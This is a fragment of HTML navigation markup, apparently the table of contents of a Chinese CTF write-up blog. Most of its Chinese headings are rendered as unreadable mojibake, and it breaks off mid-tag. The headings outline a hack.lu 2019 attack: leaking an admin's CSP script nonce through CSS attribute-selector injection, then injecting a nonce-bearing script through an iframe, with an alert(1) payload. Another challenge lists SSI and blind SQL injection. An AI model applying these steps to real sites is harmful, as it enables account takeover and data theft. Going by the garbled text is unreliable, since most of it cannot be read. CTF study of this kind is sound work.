href="#å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">å¦‚æœæ²¡æœ‰æŒ‡å®šåç§°ï¼Œåˆ™åœ¨åŠ å…¥æ—¶ä¼šéšæœºç”Ÿæˆä¸€ä¸ªUUIDã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚"><span class="nav-number">1.6.2.3.</span> <span class="nav-text">ä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨èŠå¤©å®¤ä¸­å‘é€æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œå¯ä»¥å°†ç”¨æˆ·åæ›´æ”¹ä¸ºå¦ä¸€ä¸ªéšæœºçš„ç”¨æˆ·åï¼ŒåŠ å…¥æ–°çš„éšæœºèŠå¤©å®¤å¹¶å°†è¯¥èŠå¤©å®¤æŠ¥å‘Šç»™ç®¡ç†å‘˜ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚"><span class="nav-number">1.6.2.4.</span> <span class="nav-text">æŠ¥å‘Šåï¼Œç®¡ç†å‘˜å°†åŠ å…¥èŠå¤©å®¤å¹¶åœ¨èŠå¤©å®¤ä¸­å¾…15ç§’ã€‚å¦å¤–ï¼ŒèŠå¤©å®¤æ˜¯åŸºäºwebsocketsã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åˆ©ç”¨"><span class="nav-number">1.6.3.</span> <span class="nav-text">åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#æ”¶é›†ä¿¡æ¯-ä¾‹å¦‚NSA"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">æ”¶é›†ä¿¡æ¯(ä¾‹å¦‚NSA)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">æ¶ˆæ¯æ²¡æœ‰è¢«æ¸…é™¤ï¼Œå³å¯ä»¥æ³¨å…¥ä»»æ„çš„HTMLã€‚ä½†æ˜¯ï¼ŒCSPç­–ç•¥å…·æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„nonceå±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">ä»…å½“è„šæœ¬å…·æœ‰æ­£ç¡®çš„nonceå±æ€§æ—¶æ‰æ‰§è¡Œè„šæœ¬æ ‡ç­¾ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸ºscript-src-39-nonce-cff855cb552d6be6be760496-39-ã€‚"><span class="nav-number">1.6.3.4.</span> <span class="nav-text">è¿™ä¸ªnonceåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶åœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå¹¶ä¸”åœ¨CSPä¸­æŒ‡å®šä¸ºscript-src &#39;nonce-cff855cb552d6be6be760496&#39;;ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚"><span class="nav-number">1.6.3.5.</span> <span class="nav-text">è¿™ä¼šé˜»æ­¢å…¶ä»–çš„å°è¯•å’ŒæŠ€å·§å»æ‰§è¡Œjavascriptä»£ç åƒé‚£äº›äº‹ä»¶å¤„ç†ç¨‹åºã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“nonceåœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼-ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦-ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚"><span class="nav-number">1.6.3.6.</span> <span class="nav-text">å› æ­¤ï¼Œè¦æ‰§è¡Œjavascriptä»£ç ï¼Œéœ€è¦çŸ¥é“nonceåœ¨åŠ è½½é¡µé¢æ—¶çš„å€¼(ä¹Ÿå°±æ˜¯24ä¸ªå­—ç¬¦)ï¼Œè¿™æ˜¾ç„¶æˆ‘ä»¬æ˜¯æ— æ³•ä»ç®¡ç†å‘˜å“ªé‡Œè½»æ¾è·å–çš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒstyle-srcè¢«è®¾ç½®ä¸ºunsafe-inlineå’Œimg-srcæ˜¯-ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚"><span class="nav-number">1.6.3.7.</span> <span class="nav-text">æˆ‘ä»¬ç°åœ¨å¯ä»¥åšçš„æ˜¯ï¼Œè™½ç„¶æ˜¯åŠ è½½ä»»æ„çš„CSSå’Œå›¾åƒstyle-srcè¢«è®¾ç½®ä¸ºunsafe-inlineå’Œimg-srcæ˜¯*ä½†æ˜¯å®ƒæœ‰ä¸€äº›æœ‰è¶£çš„æ”»å‡»æ–¹å¼ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è·å–éšæœºæ•°"><span class="nav-number">1.6.4.</span> <span class="nav-text">è·å–éšæœºæ•°</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">åœ¨ç½‘ä¸Šæœç´¢æˆ‘ä»¬çš„æƒ³æ³•æ—¶ï¼Œæˆ‘ä»¬å¶ç„¶å‘ç°äº†2016å¹´ä»¥æ¥çš„è¿™ç¯‡æ–‡ç« ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-sirdarckcat-blogspot-com-2016-12-how-to-bypass-csp-nonces-with-dom-xss-htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">https://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.htmlå…¶ä½œè€…æè¿°äº†æ”»å‡»è€…å¯ä»¥ä½¿ç”¨cssæå–å…¶å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚"><span class="nav-number">1.6.4.3.</span> <span class="nav-text">è¿™æ˜¯éå¸¸åˆé€‚çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ³¨å…¥ä»»æ„çš„CSSï¼å› æ­¤æˆ‘ä»¬åƒé€‚å½“çš„é»‘å®¢ä¸€æ ·ï¼Œå¤åˆ¶äº†ä»–çš„è„šæœ¬ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚"><span class="nav-number">1.6.4.4.</span> <span class="nav-text">ä½†æ˜¯ï¼Œç»™å®šçš„é€‰æ‹©å™¨ä¸èµ·ä½œç”¨ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚"><span class="nav-number">1.6.4.5.</span> <span class="nav-text">å› æ­¤æˆ‘ä»¬è‡ªå·±å¼€å§‹è‡ªè¡Œçš„è°ƒè¯•é€‰æ‹©å™¨ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…scriptæ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š"><span class="nav-number">1.6.4.6.</span> <span class="nav-text">ä¹‹åæˆ‘ä»¬å°è¯•å»åŒ¹é…scriptæ ‡ç­¾ä½¿ç”¨Chromeå¤±è´¥æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°äº†ä¸€äº›å¥‡æ€ªçš„ç°è±¡ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ChromeåŠ è½½åå°†å…¶nonceä»script-tagä¸­åˆ é™¤ã€‚"><span class="nav-number">1.6.4.7.</span> <span class="nav-text">ChromeåŠ è½½åå°†å…¶nonceä»script-tagä¸­åˆ é™¤ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯ã€‚Firefoxå°†nonceä¿å­˜æ—©DOMæ ‘ä¸­ã€‚"><span class="nav-number">1.6.4.8.</span> <span class="nav-text">ä½†æ˜¯ã€‚Firefoxå°†nonceä¿å­˜æ—©DOMæ ‘ä¸­ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„user-agentå¤´ä¸­å‘ç°çš„ã€‚"><span class="nav-number">1.6.4.9.</span> <span class="nav-text">å¹¸è¿çš„æ˜¯ï¼Œæ”»å‡»è€…ä½¿ç”¨çš„æ˜¯Firefoxï¼Œæˆ‘ä»¬æ˜¯ä»ç®¡ç†å‘˜çš„user-agentå¤´ä¸­å‘ç°çš„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯scriptç›´æ¥åŒ¹é…æ ‡è®°ï¼šscript-nonce-quot-a-quot-ã€‚"><span class="nav-number">1.6.4.10.</span> <span class="nav-text">æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯scriptç›´æ¥åŒ¹é…æ ‡è®°ï¼šscript[nonce^=&quot;a&quot;]ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™åº”å°†ä»»ä½•scriptæ ‡è®°ä¸ä»¥å¼€å¤´çš„nonceåŒ¹é…aã€‚"><span class="nav-number">1.6.4.11.</span> <span class="nav-text">è¿™åº”å°†ä»»ä½•scriptæ ‡è®°ä¸ä»¥å¼€å¤´çš„nonceåŒ¹é…aã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…scriptæ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼šscript-nonce-quot-s-quot-navã€‚"><span class="nav-number">1.6.4.12.</span> <span class="nav-text">ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…scriptæ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼šscript[nonce^=&quot;%s&quot;] ~ navã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å› ä¸ºnavå’Œscriptæ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚"><span class="nav-number">1.6.4.13.</span> <span class="nav-text">å› ä¸ºnavå’Œscriptæ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š"><span class="nav-number">1.6.5.</span> <span class="nav-text">ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘-å› æ­¤ï¼Œä»…æ‰§è¡Œ-quot-æ­£ç¡®-quot-è¯·æ±‚-ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š"><span class="nav-number">1.6.5.1.</span> <span class="nav-text">ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘(å› æ­¤ï¼Œä»…æ‰§è¡Œ&quot;æ­£ç¡®&quot;è¯·æ±‚)ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ªnonceã€‚"><span class="nav-number">1.6.5.2.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ªnonceã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚"><span class="nav-number">1.6.5.3.</span> <span class="nav-text">æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚"><span class="nav-number">1.6.5.4.</span> <span class="nav-text">ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„nonceï¼"><span class="nav-number">1.6.5.5.</span> <span class="nav-text">ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„nonceï¼</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#åˆ›å»ºæ¼æ´"><span class="nav-number">1.7.</span> <span class="nav-text">åˆ›å»ºæ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ç°åœ¨æˆ‘ä»¬æœ‰äº†nonceï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°-evaluated-è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬iframeé€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­srcdocã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š"><span class="nav-number">1.7.0.1.</span> <span class="nav-text">ç°åœ¨æˆ‘ä»¬æœ‰äº†nonceï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°(evaluated)è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬iframeé€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­srcdocã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚"><span class="nav-number">1.7.0.2.</span> <span class="nav-text">æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Putting-it-all-together"><span class="nav-number">1.7.1.</span> <span class="nav-text">Putting it all together</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Our-final-approach-was-the-following"><span class="nav-number">1.7.1.1.</span> <span class="nav-text">Our final approach was the following:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit"><span class="nav-number">1.7.1.2.</span> <span class="nav-text">1. Enter a chatroom using Chrome so that we are unaffected by the exploit</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-Start-the-exploit-server-pointed-at-the-chatroom"><span class="nav-number">1.7.1.3.</span> <span class="nav-text">2. Start the exploit server pointed at the chatroom</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-Report-the-chatroom-and-wait-for-the-admin-to-join"><span class="nav-number">1.7.1.4.</span> <span class="nav-text">3. Report the chatroom and wait for the admin to join</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-Send-the-initial-CSS-payload-manually-through-the-browser"><span class="nav-number">1.7.1.5.</span> <span class="nav-text">4. Send the initial CSS payload manually through the browser.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-Let-the-server-handle-the-rest"><span class="nav-number">1.7.1.6.</span> <span class="nav-text">5. Let the server handle the rest</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Below-is-the-final-script-that-ran-on-the-server"><span class="nav-number">1.7.1.7.</span> <span class="nav-text">Below is the final script that ran on the server:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hack-lu-2019-Trees-For-Future"><span class="nav-number">1.8.</span> <span class="nav-text">hack.lu 2019 - Trees For Future</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ç”¨åˆ°çš„çŸ¥è¯†ã€‚"><span class="nav-number">1.8.1.</span> <span class="nav-text">ç”¨åˆ°çš„çŸ¥è¯†ã€‚</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">SSIæ³¨å…¥ï¼Œè¿æ¥å›æœ¬åœ°MySQLï¼ŒäºŒæ¬¡ç›²æ³¨SQLi</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æè¿°ï¼š"><span class="nav-number">1.8.2.</span> <span class="nav-text">æè¿°ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">æˆ‘ä»¬æ˜¯TreesForFutureã€‚æˆ‘ä»¬ç§¯æè‡´åŠ›äºä½¿æ›´å¤šçš„æ ‘æœ¨ç”Ÿé•¿åœ¨è¿™ä¸ªæ˜Ÿçƒã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">æœ€è¿‘ï¼Œæˆ‘ä»¬é›‡ç”¨äº†ä¸€å®¶æ‰¿åŒ…å•†ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œhttp-31-22-123-49-1908"><span class="nav-number">1.8.2.3.</span> <span class="nav-text">é¢˜ç›®çš„åœ°å€åœ¨è¿™é‡Œhttp://31.22.123.49:1908</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#é¢˜ç›®æ€»è§ˆ"><span class="nav-number">1.9.</span> <span class="nav-text">é¢˜ç›®æ€»è§ˆ</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem-ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚"><span class="nav-number">1.9.0.1.</span> <span class="nav-text">è¿™ä¸ªæŒ‘æˆ˜æä¾›äº†ä¸€ä¸ªç®€å•çš„å•é¡µç½‘ç«™ï¼Œå…¶ä¸­å……æ»¡äº†Lorem ipsumå¼•å·å’Œä¸€é¢—æ ‘çš„å›¾ç‰‡ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚"><span class="nav-number">1.9.0.2.</span> <span class="nav-text">å¯¹é¡µé¢HTMLä»£ç çš„å¿«é€Ÿåˆ†ææ˜¾ç¤ºäº†æ‰˜ç®¡å›¾ç‰‡çš„è·¯å¾„ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è¿™ä¸ªç½‘ç«™åœ¨http-31-22-123-49-1908-internal-login"><span class="nav-number">1.9.0.3.</span> <span class="nav-text">è¿™ä¸ªç½‘ç«™åœ¨http://31.22.123.49:1908/internal/login</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 